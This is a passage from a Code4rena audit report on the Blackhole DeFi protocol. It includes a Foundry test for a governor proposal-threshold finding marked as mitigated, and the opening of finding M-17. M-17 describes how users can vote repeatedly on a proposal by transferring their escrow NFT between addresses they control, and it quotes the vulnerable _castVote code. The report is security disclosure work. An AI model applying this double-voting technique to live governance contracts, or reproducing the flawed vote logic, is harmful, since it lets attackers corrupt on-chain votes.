<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">GARole</span><span class="mtk1"> = </span><span class="mtk11">string</span><span class="mtk1">(</span><span class="mtk11">bytes</span><span class="mtk1">(</span><span class="mtk8">"GAUGE_ADMIN"</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">.</span><span class="mtk11">setRoleFor</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk12">GARole</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tokenHandler</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">TokenHandler</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">AutoVotingEscrowManager</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VotingEscrow</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">black</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardsDistributor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">RewardsDistributor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactoryCL</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactory</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairGenerator</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairGenerator</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">gaugeManager</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeManager</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactory</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_1</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MinterUpgradeable</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">BlackGovernor</span><span class="mtk1">(</span><span class="mtk11">IBlackHoleVotes</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setBlackGovernor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">rewardsDistributor</span><span class="mtk1">.</span><span class="mtk11">setDepositor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setVoter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk7">10_000_000e18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_proposeRevertGetVote</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">claimants</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">_initialize</span><span class="mtk1">(</span><span class="mtk12">claimants</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span><span class="mtk3">//zero % ownership of top protcols</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">userABal</span><span class="mtk1"> = </span><span class="mtk7">1_000_000e18</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">, </span><span class="mtk12">userABal</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1">.</span><span class="mtk11">create_lock</span><span class="mtk1">(</span><span class="mtk7">1_000_000e18</span><span class="mtk1">, </span><span class="mtk7">4</span><span class="mtk1"> * </span><span class="mtk7">365</span><span class="mtk1"> </span><span class="mtk12">days</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk7">3600</span><span class="mtk1">); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">uint256</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">targets</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">values</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">calldatas</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encodeWithSelector</span><span class="mtk1">(</span><span class="mtk12">IMinter</span><span class="mtk1">.</span><span class="mtk12">nudge</span><span class="mtk1">.</span><span class="mtk12">selector</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">expectRevert</span><span class="mtk1">( </span><span class="mtk8">"Governor: proposer votes below proposal threshold"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">propose</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Nudge proposal"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-43">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-9">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-59">maxvzuvex</a>.</p>
<p>The sponsor team requested that the following note be included: </p>
<blockquote>
<p>This issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.
Reference: <a href="https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256">https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L256</a></p>
</blockquote>
<hr>
<h2 style="position:relative;" id="m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again"><a class="anchor before" aria-label="m 17 users can cast their votes multiple times for the proposal by transferring their nfts and then voting again permalink" href="#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-165">[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-412">hakunamatata</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L534-L554</a></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-5"><a class="anchor before" aria-label="finding description and impact 5 permalink" href="#finding-description-and-impact-5"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the <code>BlackGovernor</code> contract users can cast their vote on the proposal. The requirements to cast the vote are that proposal has to be active, and the <code>msg.sender</code> has not voted on the proposal. The voting power is determined by the balance of it’s smNFT locked position at the time of <code>voteStart</code>. </p>
<p>This introduces serious vulnerability where users can cast their vote at <code>voteStart</code> timestamp, immediately send their nft using <code>transferFrom</code> to another address which they control and <code>castVote</code> again.  Malicious users can repeat this process they run out of gas.</p>
<p>One of the reasons that this issue persists is that the code does not utilize ownership change mapping inside the <code>VotingEscrow</code> contract. Because it’s so easy to <code>castVote</code> send to another address (which would be contract) and <code>castVote</code> again, leading to complete disruption of voting process, I believe it is High Severity finding.</p>
<p>This is code snippet of <code>castVote</code> function that shows that there is no verification whether particular nft has been used to vote.</p>
<pre data-index="67" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">_castVote</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint8</span><span class="mtk1"> </span><span class="mtk12">support</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">string</span><span class="mtk1">  </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">reason</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes</span><span class="mtk1">  </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">params</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">ProposalCore</span><span class="mtk1">  </span><span class="mtk12">storage</span><span class="mtk1"> </span><span class="mtk12">proposal</span><span class="mtk1"> = </span><span class="mtk12">_proposals</span><span class="mtk1">[</span><span class="mtk12">proposalId</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">state</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">) == </span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Active</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">"Governor: vote not currently active"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">weight</span><span class="mtk1"> = </span><span class="mtk11">_getVotes</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">proposal</span><span class="mtk1">.</span><span class="mtk12">voteStart</span><span class="mtk1">.</span><span class="mtk11">getDeadline</span><span class="mtk1">(),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">params</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">_countVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">support</span><span class="mtk1">, </span><span class="mtk12">weight</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">emit</span><span class="mtk1">  </span><span class="mtk11">VoteCast</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">support</span><span class="mtk1">, </span><span class="mtk12">weight</span><span class="mtk1">, </span><span class="mtk12">reason</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">emit</span><span class="mtk1">  </span><span class="mtk11">VoteCastWithParams</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">account</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">proposalId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">support</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">weight</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">reason</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">params</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">weight</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
